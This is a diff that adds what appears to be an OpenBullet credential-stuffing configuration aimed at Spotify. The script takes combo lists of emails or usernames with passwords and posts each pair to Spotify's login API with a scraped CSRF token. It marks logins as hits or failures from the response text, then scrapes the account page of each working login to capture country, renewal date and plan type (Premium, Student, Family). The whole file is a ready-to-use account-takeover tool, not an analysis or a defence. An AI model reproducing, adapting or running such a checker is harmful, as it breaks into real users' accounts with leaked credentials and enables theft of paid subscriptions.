@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "SpotifyAPi",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-11T16:23:37.6090208+02:00",
+  "AdditionalInfo": "Yossers",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Lucky",
+  "Version": "1.2.1.6",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#REQUESTspotify REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PARSEtoken PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#REQUESTlogin REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"errorInvalidCredentials\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"displayName\":\"" 
+
+#REQUESToverview REQUEST GET "https://www.spotify.com/us/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Spotify Free" 
+    KEY "Premium Paused" 
+
+#Country PARSE "<SOURCE>" LR "card-profile-country\">" "</p>" -> CAP "Country" 
+
+#Renew PARSE "<SOURCE>" LR "<b class=\"recurring-date\">" "<" -> CAP "Renew" 
+
+#subscription PARSE "<SOURCE>" LR "<h3 class=\"product-name\">" "</h3>" -> VAR "subscription" 
+
+IF "<subscription>" Contains "Premium for Students"
+JUMP #fixtags
+ENDIF
+IF "<subscription>" Contains "<span class="icon-checkmark-wrap"><svg><use xlink:href="#icon-checkmark"></use></svg></span>Spotify Premium"
+JUMP #fixtags
+ENDIF
+IF "<subscription>" Contains "<span class="icon-checkmark-wrap"><svg><use xlink:href="#icon-checkmark"></use></svg></span>Spotify Premium + Hulu"
+JUMP #fixtags
+ENDIF
+IF "<subscription>" Contains "Premium for Students + Hulu"
+JUMP #fixtags
+ENDIF
+
+#familyStatus PARSE "<SOURCE>" LR "<p class=\"subscription-status subscription-compact\">" "</p>" -> VAR "fstatus" 
+
+IF "<fstatus>" Contains "You're a member of a family plan."
+JUMP #fixtags
+ENDIF
+
+#fixtags2 FUNCTION Replace "Premium for Family" "Family Owner" "<subscription>" -> VAR "fixplan2" 
+
+#PARSEfamilyOwner PARSE "<fixplan2>" LR "" "" -> VAR "subscription" 
+
+#fixtags FUNCTION Replace "<span class=\"icon-checkmark-wrap\"><svg><use xlink:href=\"#icon-checkmark\"></use></svg></span>" "" "<subscription>" -> VAR "fixplan" 
+
+#LastPlanFix FUNCTION Replace "Premium for Family" "Part of Family" "<fixplan>" -> VAR "subPlan" 
+
+#PLAN PARSE "<subPlan>" LR "" "" -> CAP "Plan" 
+
